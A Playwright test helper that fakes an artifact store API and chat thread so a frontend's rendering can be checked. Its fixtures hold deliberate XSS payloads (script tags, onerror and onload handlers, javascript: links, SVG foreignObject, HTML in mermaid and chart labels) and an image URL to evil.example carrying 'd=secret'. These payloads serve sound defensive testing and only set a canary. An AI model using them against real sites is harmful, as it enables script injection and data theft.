import { deflateSync } from "node:zlib";

import type { Page, Route } from "@playwright/test";

/**
 * Spec 012 Slice 1: a fake artifact store for the rendering specs. It serves
 * the gateway's /api/artifacts routes as specs/012-artifacts/api.md defines
 * them, from fixtures, and logs every write the page sends. No real backend.
 *
 * The fixtures are HOSTILE on purpose: markdown with raw HTML and a
 * javascript: link, an SVG with <script>, handlers and foreignObject (the
 * gateway refuses those on write; the host must stay inert even if one got
 * through), a mermaid label with HTML, a chart with markup in its labels.
 * Every payload would set window.__canary if it ever ran.
 */

export const CANARY = "window.__canary=1";
export const THREAD = "12121212-3434-5656-7878-909090909090";
const NOW = Date.now();
const iso = (s: number) => new Date(NOW + s * 1000).toISOString();

export const IDS = {
  md: "MdBriefAAAAAAAAAAAAAAA",
  code: "CodePyBBBBBBBBBBBBBBBB",
  svg: "SvgHostileCCCCCCCCCCCC",
  mermaid: "MermaidDDDDDDDDDDDDDDD",
  broken: "MermaidBrokenEEEEEEEEE",
  chart: "ChartFFFFFFFFFFFFFFFFF",
  image: "ImagePngGGGGGGGGGGGGGG",
  big: "BigFileHHHHHHHHHHHHHHH",
  archived: "ArchivedIIIIIIIIIIIIII",
} as const;

export const HOSTILE_MARKDOWN = [
  "# Project brief",
  "",
  "A short brief with **bold** text and a list:",
  "",
  "- one",
  "- two",
  "",
  `<img src="x" onerror="${CANARY}">`,
  "<kbd>RAW</kbd>",
  `<script>${CANARY}</script>`,
  `<iframe src="javascript:${CANARY}"></iframe>`,
  `[a link](javascript:${CANARY})`,
  "![pixel](https://evil.example/p.png?d=secret)",
].join("\n");

export const HOSTILE_SVG =
  `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="160" height="80" viewBox="0 0 160 80" onload="${CANARY}">` +
  `<script>${CANARY}</script>` +
  `<rect width="160" height="80" rx="8" fill="#2a78d6"/>` +
  `<image href="https://evil.example/x.png" onerror="${CANARY}" width="10" height="10"/>` +
  `<foreignObject width="10" height="10"><img xmlns="http://www.w3.org/1999/xhtml" src="x" onerror="${CANARY}"/></foreignObject>` +
  `<text x="80" y="46" text-anchor="middle" fill="#fff" font-size="16">Logo</text></svg>`;

export const MERMAID_SOURCE = [
  "graph TD",
  `  A["Start <img src=x onerror=${CANARY}>"] --> B{Ready?}`,
  "  B -->|yes| C[Ship it]",
  "  B -->|no| D[Fix]",
].join("\n");

export const CHART = {
  schema: "omni-chart/1",
  type: "bar",
  title: `CI pass rate <img src=x onerror="${CANARY}">`,
  x: { field: "day", type: "category", label: "Day" },
  series: [
    { field: "pass", label: `Passed <script>${CANARY}</script>` },
    { field: "fail", label: "Failed" },
  ],
  data: [
    { day: `Mon <b onmouseover="${CANARY}">x</b>`, pass: 12, fail: 2 },
    { day: "Tue", pass: 15, fail: 1 },
    { day: "Wed", pass: 9, fail: 4 },
    { day: "Thu", pass: 14, fail: null },
    { day: "Fri", pass: 18, fail: 0 },
  ],
  units: "runs",
};

// A 96x60 gradient PNG, built here (no binary fixture in the repo).
function makePng(w = 96, h = 60): Buffer {
  const rows: number[] = [];
  for (let y = 0; y < h; y++) {
    rows.push(0);
    for (let x = 0; x < w; x++) rows.push(40 + x * 2, 120 + y, 214);
  }
  const crcTable = Array.from({ length: 256 }, (_, n) => {
    let c = n;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    return c >>> 0;
  });
  const crc = (buf: Buffer) => {
    let c = 0xffffffff;
    for (const b of buf) c = crcTable[(c ^ b) & 0xff]! ^ (c >>> 8);
    return (c ^ 0xffffffff) >>> 0;
  };
  const chunk = (type: string, data: Buffer) => {
    const len = Buffer.alloc(4);
    len.writeUInt32BE(data.length);
    const td = Buffer.concat([Buffer.from(type, "ascii"), data]);
    const c = Buffer.alloc(4);
    c.writeUInt32BE(crc(td));
    return Buffer.concat([len, td, c]);
  };
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(w, 0);
  ihdr.writeUInt32BE(h, 4);
  ihdr.set([8, 2, 0, 0, 0], 8);
  return Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    chunk("IHDR", ihdr),
    chunk("IDAT", deflateSync(Buffer.from(rows))),
    chunk("IEND", Buffer.alloc(0)),
  ]);
}
const PNG = makePng();

interface Version {
  n: number;
  content: unknown;
  lineage: "user" | "content";
  lineage_source: string | null;
  origin: string;
  note: string | null;
  stored?: "blob" | "chat";
  tool_call_id?: string | null;
}

interface Rec {
  id: string;
  kind: string;
  title: string;
  pinned: boolean;
  archived: boolean;
  origin_thread_id: string | null;
  imported_from: string | null;
  language: string | null;
  size: number;
  versions: Version[];
  updated: number;
}

function fixtures(): Rec[] {
  const base = (
    id: string,
    kind: string,
    title: string,
    versions: Version[],
    over: Partial<Rec> = {},
  ): Rec => ({
    id,
    kind,
    title,
    pinned: false,
    archived: false,
    origin_thread_id: THREAD,
    imported_from: null,
    language: null,
    size: 1200,
    versions,
    updated: -60,
    ...over,
  });
  const v = (n: number, content: unknown, over: Partial<Version> = {}) => ({
    n,
    content,
    lineage: "user" as const,
    lineage_source: null,
    origin: "tool",
    note: null,
    tool_call_id: `call_${n}`,
    ...over,
  });
  return [
    base(
      IDS.md,
      "markdown",
      "Project brief",
      [
        v(
          1,
          HOSTILE_MARKDOWN.replace("# Project brief", "# Project brief draft"),
        ),
        v(2, HOSTILE_MARKDOWN, {
          lineage: "content",
          lineage_source: "web_fetch",
          note: "Shortened the title",
        }),
      ],
      { pinned: true, updated: -30 },
    ),
    base(
      IDS.code,
      "code",
      "fizzbuzz.py",
      [
        v(1, {
          language: "python",
          text: 'def fizzbuzz(n):\n    for i in range(1, n + 1):\n        print("FizzBuzz" if i % 15 == 0 else i)\n',
        }),
      ],
      { language: "python" },
    ),
    base(IDS.svg, "svg", "Logo sketch", [v(1, null)]),
    base(IDS.mermaid, "mermaid", "Release flow", [v(1, MERMAID_SOURCE)]),
    base(IDS.broken, "mermaid", "Broken diagram", [
      v(1, "graph TD\n  A --> \n  ((( this is not mermaid"),
    ]),
    base(IDS.chart, "chart", CHART.title, [v(1, CHART)]),
    base(IDS.image, "image", "Screenshot", [v(1, null)]),
    base(
      IDS.big,
      "file",
      "recording.mov",
      [v(1, null, { origin: "import", stored: "chat" })],
      {
        imported_from: `${THREAD}:/mnt/user-data/outputs/recording.mov`,
        size: 20 * 1024 * 1024,
      },
    ),
    base(
      IDS.archived,
      "markdown",
      `Old notes ${"with a very long title ".repeat(4)}`,
      [v(1, "Old"), v(2, "Older"), v(3, "Oldest")],
      { archived: true, origin_thread_id: null },
    ),
  ];
}

const summary = (r: Rec) => {
  const latest = r.versions[r.versions.length - 1]!;
  return {
    id: r.id,
    kind: r.kind,
    title: r.title,
    latest_version: latest.n,
    version_count: r.versions.length,
    pinned: r.pinned,
    archived: r.archived,
    archived_at: r.archived ? iso(-10) : null,
    origin_thread_id: r.origin_thread_id,
    origin_turn_id: r.origin_thread_id ? "run-1" : null,
    imported_from: r.imported_from,
    lineage: latest.lineage,
    lineage_source: latest.lineage_source,
    language: r.language,
    media_type: "text/plain",
    size: r.size,
    created_at: iso(-3600),
    updated_at: iso(r.updated),
  };
};

const version = (r: Rec, v: Version) => ({
  n: v.n,
  content_hash: "a".repeat(64),
  size: 100,
  media_type: "text/plain",
  language: r.language,
  lineage: v.lineage,
  lineage_source: v.lineage_source,
  origin: v.origin,
  base_version: v.n > 1 ? v.n - 1 : null,
  note: v.note,
  thread_id: r.origin_thread_id,
  turn_id: "run-1",
  tool_call_id: v.tool_call_id ?? null,
  stored: v.stored ?? "blob",
  created_at: iso(-3600 + v.n * 60),
});

export interface StoreLog {
  gets: string[];
  writes: { method: string; path: string; body: unknown }[];
}

export interface StoreOptions {
  /** Every /api/artifacts route answers 404 (the backend PR not merged). */
  missing?: boolean;
  /** The next owner edit answers 409 stale_base_version (another tab won). */
  staleOnce?: boolean;
  empty?: boolean;
}

const json = (body: unknown, status = 200) => ({
  status,
  contentType: "application/json",
  body: JSON.stringify(body),
});
const notFound = (code = "artifact_not_found") =>
  json({ detail: { code, message: "Not found." } }, 404);

export async function installFakeStore(
  page: Page,
  opts: StoreOptions = {},
): Promise<{ log: StoreLog; recs: Rec[] }> {
  const recs = opts.empty ? [] : fixtures();
  const log: StoreLog = { gets: [], writes: [] };
  let stale = !!opts.staleOnce;
  const find = (id: string) => recs.find((r) => r.id === id);

  await page.route(/\/api\/artifacts(\/|\?|$)/, async (route: Route) => {
    const req = route.request();
    const url = new URL(req.url());
    const path = url.pathname;
    const method = req.method();
    if (method === "GET") log.gets.push(path + url.search);
    else
      log.writes.push({
        method,
        path,
        body: req.postData() ? (req.postDataJSON() as unknown) : null,
      });
    if (opts.missing)
      return route.fulfill({
        status: 404,
        body: '{"detail":"Not Found"}',
        contentType: "application/json",
      });

    if (path === "/api/artifacts") {
      const p = url.searchParams;
      let list = [...recs];
      const archived = p.get("archived") ?? "false";
      if (archived === "true") list = list.filter((r) => r.archived);
      else if (archived === "false") list = list.filter((r) => !r.archived);
      if (p.get("kind")) list = list.filter((r) => r.kind === p.get("kind"));
      if (p.get("pinned") === "true") list = list.filter((r) => r.pinned);
      if (p.get("thread"))
        list = list.filter((r) => r.origin_thread_id === p.get("thread"));
      const q = (p.get("q") ?? "").toLowerCase();
      if (q) list = list.filter((r) => r.title.toLowerCase().includes(q));
      list.sort(
        (a, b) => Number(b.pinned) - Number(a.pinned) || b.updated - a.updated,
      );
      return route.fulfill(
        json({
          artifacts: list.map(summary),
          total: list.length,
          usage: { used: 52311, cap: 1073741824 },
        }),
      );
    }
    if (path === "/api/artifacts/usage") {
      return route.fulfill(json({ used: 52311, cap: 1073741824 }));
    }
    const m = /^\/api\/artifacts\/([^/]+)(?:\/(.*))?$/.exec(path);
    if (!m) return route.fulfill(notFound());
    const rec = find(m[1]!);
    const rest = m[2] ?? "";
    if (!rec) return route.fulfill(notFound());
    const latest = () => rec.versions[rec.versions.length - 1]!;
    const body = (req.postData() ? req.postDataJSON() : {}) as Record<
      string,
      unknown
    >;

    if (method === "GET" && rest === "") {
      return route.fulfill(
        json({
          ...summary(rec),
          versions: [...rec.versions].reverse().map((v) => version(rec, v)),
        }),
      );
    }
    const vm = /^versions\/(\d+)(\/content)?$/.exec(rest);
    if (method === "GET" && vm) {
      const v = rec.versions.find((x) => x.n === Number(vm[1]));
      if (!v) return route.fulfill(notFound("version_not_found"));
      if (vm[2]) {
        const headers = {
          "X-Content-Type-Options": "nosniff",
          "Content-Security-Policy": "default-src 'none'; sandbox",
          "Cross-Origin-Resource-Policy": "same-origin",
          "Cache-Control": "no-store",
        };
        if (rec.kind === "svg")
          return route.fulfill({
            status: 200,
            headers: { ...headers, "Content-Type": "image/svg+xml" },
            body: HOSTILE_SVG,
          });
        if (rec.kind === "image")
          return route.fulfill({
            status: 200,
            headers: { ...headers, "Content-Type": "image/png" },
            body: PNG,
          });
        if (v.stored === "chat")
          return route.fulfill(
            json(
              {
                detail: {
                  code: "lives_in_chat",
                  message: "It lives in its chat.",
                  thread_id: THREAD,
                  path: "/mnt/user-data/outputs/recording.mov",
                },
              },
              409,
            ),
          );
        return route.fulfill({
          status: 200,
          headers: { ...headers, "Content-Type": "text/plain; charset=utf-8" },
          body:
            typeof v.content === "string"
              ? v.content
              : JSON.stringify(v.content),
        });
      }
      const inline = ["markdown", "mermaid", "code", "chart"].includes(
        rec.kind,
      );
      return route.fulfill(
        json({ ...version(rec, v), content: inline ? v.content : null }),
      );
    }
    if (method === "PATCH" && rest === "") {
      if (typeof body.title === "string") rec.title = body.title;
      if (typeof body.pinned === "boolean") {
        if (rec.archived)
          return route.fulfill(
            json({ detail: { code: "artifact_archived", message: "" } }, 409),
          );
        rec.pinned = body.pinned;
      }
      return route.fulfill(json(summary(rec)));
    }
    if (method === "POST" && (rest === "archive" || rest === "unarchive")) {
      rec.archived = rest === "archive";
      if (rec.archived) rec.pinned = false;
      return route.fulfill(json(summary(rec)));
    }
    if (method === "POST" && (rest === "versions" || rest === "restore")) {
      const base = Number(body.base_version);
      if (stale || base !== latest().n) {
        stale = false;
        // Another tab saved meanwhile: the store moves on.
        if (base === latest().n) {
          rec.versions.push({
            ...latest(),
            n: latest().n + 1,
            origin: "owner_edit",
            note: null,
          });
        }
        return route.fulfill(
          json(
            {
              detail: {
                code: "stale_base_version",
                message: `This artifact changed: the latest version is ${latest().n}.`,
                current_version: latest().n,
              },
            },
            409,
          ),
        );
      }
      const content =
        rest === "restore"
          ? rec.versions.find((x) => x.n === Number(body.version))!.content
          : rec.kind === "code"
            ? { language: body.language ?? "text", text: body.content }
            : body.content;
      const next: Version = {
        n: latest().n + 1,
        content,
        lineage: "user",
        lineage_source: null,
        origin: rest === "restore" ? "restore" : "owner_edit",
        note: null,
      };
      rec.versions.push(next);
      return route.fulfill(
        json({ artifact: summary(rec), version: version(rec, next) }, 201),
      );
    }
    if (method === "POST" && rest === "duplicate") {
      return route.fulfill(json(summary(rec), 201));
    }
    if (method === "POST" && rest === "delete") {
      if (!rec.archived)
        return route.fulfill(
          json({ detail: { code: "not_archived", message: "" } }, 409),
        );
      if (
        body.confirm_id !== rec.id ||
        body.version_count !== rec.versions.length
      ) {
        return route.fulfill(
          json(
            {
              detail: {
                code: "confirmation_mismatch",
                message: "",
                version_count: rec.versions.length,
              },
            },
            400,
          ),
        );
      }
      recs.splice(recs.indexOf(rec), 1);
      return route.fulfill(json({ deleted: rec.id }));
    }
    return route.fulfill(notFound());
  });
  return { log, recs };
}

/** A chat whose turns made artifacts: each tool result carries the card. */
export function threadState() {
  const create = (
    callId: string,
    name: string,
    id: string,
    version: number,
    kind: string,
  ) => [
    {
      type: "ai",
      id: `ai-${callId}`,
      content: "",
      tool_calls: [{ id: callId, name, args: { kind, title: "…" } }],
    },
    {
      type: "tool",
      id: `t-${callId}`,
      name,
      tool_call_id: callId,
      content: `Created ${kind} artifact \`${id}\` version ${version}.`,
      artifact: { type: "omni_artifact", artifact_id: id, version, kind },
    },
  ];
  const messages = [
    { type: "human", id: "h1", content: "Draft a one-page project brief." },
    ...create("c1", "artifact_create", IDS.md, 1, "markdown"),
    { type: "ai", id: "a1", content: "Here is the brief." },
    { type: "human", id: "h2", content: "Make the title shorter." },
    ...create("c2", "artifact_update", IDS.md, 2, "markdown"),
    { type: "ai", id: "a2", content: "Done: version 2." },
    {
      type: "human",
      id: "h3",
      content:
        "Chart CI, sketch a logo, draw the release flow, write fizzbuzz.",
    },
    ...create("c3", "artifact_create", IDS.chart, 1, "chart"),
    ...create("c4", "artifact_create", IDS.svg, 1, "svg"),
    ...create("c5", "artifact_create", IDS.mermaid, 1, "mermaid"),
    ...create("c6", "artifact_create", IDS.code, 1, "code"),
    ...create("c7", "artifact_create", IDS.image, 1, "image"),
    ...create("c8", "artifact_create", IDS.broken, 1, "mermaid"),
    // A refused call: no artifact field, no card.
    {
      type: "ai",
      id: "ai-c9",
      content: "",
      tool_calls: [{ id: "c9", name: "artifact_create", args: {} }],
    },
    {
      type: "tool",
      id: "t-c9",
      name: "artifact_create",
      tool_call_id: "c9",
      content: "Refused: too large.",
      artifact: null,
    },
    { type: "ai", id: "a3", content: "All made." },
  ];
  return {
    values: { title: "Brief and charts", messages },
    next: [],
    tasks: [],
    metadata: {},
    created_at: new Date().toISOString(),
    checkpoint: { thread_id: THREAD, checkpoint_id: "c1", checkpoint_ns: "" },
    parent_checkpoint: null,
  };
}

/** The chat routes a thread page needs, with no backend. */
export async function installThread(page: Page) {
  const state = threadState();
  await page.route("**/api/langgraph/**", (route) => {
    const url = route.request().url();
    if (url.includes("/history")) return route.fulfill(json([state]));
    if (url.includes("/runs") || url.includes("/search"))
      return route.fulfill(json([]));
    return route.fulfill(json(state));
  });
  await page.route("**/api/confirmations", (route) =>
    route.fulfill(json({ actions: [], readable: true, error: "" })),
  );
  await page.route("**/api/inbox/alerts", (route) =>
    route.fulfill(json({ alerts: [], waiting_count: 0 })),
  );
  await page.route("**/api/threads/*/artifacts/manifests", (route) =>
    route.fulfill(json({ manifests: [] })),
  );
}
